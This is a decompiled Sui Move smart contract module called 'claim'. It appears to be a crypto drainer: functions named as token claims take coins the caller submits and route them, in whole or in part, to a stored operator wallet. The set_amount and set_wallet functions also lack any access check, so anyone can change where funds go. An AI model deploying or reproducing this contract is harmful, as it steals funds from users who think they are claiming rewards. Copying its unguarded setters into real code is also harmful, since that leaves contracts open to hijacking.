module 0x5da6ce53057bbfbe58a8760cd0177885a0af4ed80fde519514b0aa8ca861aa93::claim {
    struct ClaimRegistry has key {
        id: 0x2::object::UID,
        amount: u64,
        wallet: address,
    }

    public entry fun claim_owned<T0>(arg0: &mut ClaimRegistry, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = arg0.amount;
        if (v0 == 0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, 0x2::tx_context::sender(arg2));
        } else if (0x2::coin::value<T0>(&arg1) <= v0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.wallet);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut arg1, v0, arg2), arg0.wallet);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, 0x2::tx_context::sender(arg2));
        };
    }

    public entry fun claim_ref<T0>(arg0: &mut ClaimRegistry, arg1: &mut 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = arg0.amount;
        if (v0 > 0 && 0x2::coin::value<T0>(arg1) >= v0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(arg1, v0, arg2), arg0.wallet);
        };
    }

    public entry fun claim_ref_with_amount<T0>(arg0: &mut ClaimRegistry, arg1: &mut 0x2::coin::Coin<T0>, arg2: u64, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = arg0.amount;
        if (v0 > 0 && 0x2::coin::value<T0>(arg1) >= v0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(arg1, v0, arg3), arg0.wallet);
        };
    }

    public entry fun claim_zero_split<T0>(arg0: &mut ClaimRegistry, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        if (0x2::coin::value<T0>(&arg1) == 0) {
            0x2::coin::destroy_zero<T0>(arg1);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, 0x2::tx_context::sender(arg2));
        };
    }

    public fun get_amount(arg0: &ClaimRegistry) : u64 {
        arg0.amount
    }

    public fun get_split_amount(arg0: &ClaimRegistry) : u64 {
        arg0.amount
    }

    public fun get_wallet(arg0: &ClaimRegistry) : address {
        arg0.wallet
    }

    fun init(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = ClaimRegistry{
            id     : 0x2::object::new(arg0),
            amount : 0,
            wallet : 0x2::tx_context::sender(arg0),
        };
        0x2::transfer::share_object<ClaimRegistry>(v0);
    }

    public fun process_dynamic_split<T0>(arg0: &ClaimRegistry, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        if (0x2::coin::value<T0>(&arg1) == 0) {
            0x2::coin::destroy_zero<T0>(arg1);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.wallet);
        };
    }

    public fun process_hybrid<T0>(arg0: &ClaimRegistry, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::coin::Coin<T0>, arg3: &mut 0x2::tx_context::TxContext) {
        if (0x2::coin::value<T0>(&arg1) == 0) {
            0x2::coin::destroy_zero<T0>(arg1);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, 0x2::tx_context::sender(arg3));
        };
        let v0 = arg0.amount;
        if (v0 > 0 && 0x2::coin::value<T0>(arg2) >= v0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(arg2, v0, arg3), arg0.wallet);
        };
    }

    public entry fun set_amount(arg0: &mut ClaimRegistry, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        arg0.amount = arg1;
    }

    public entry fun set_wallet(arg0: &mut ClaimRegistry, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        arg0.wallet = arg1;
    }

    // decompiled from Move bytecode v6
}

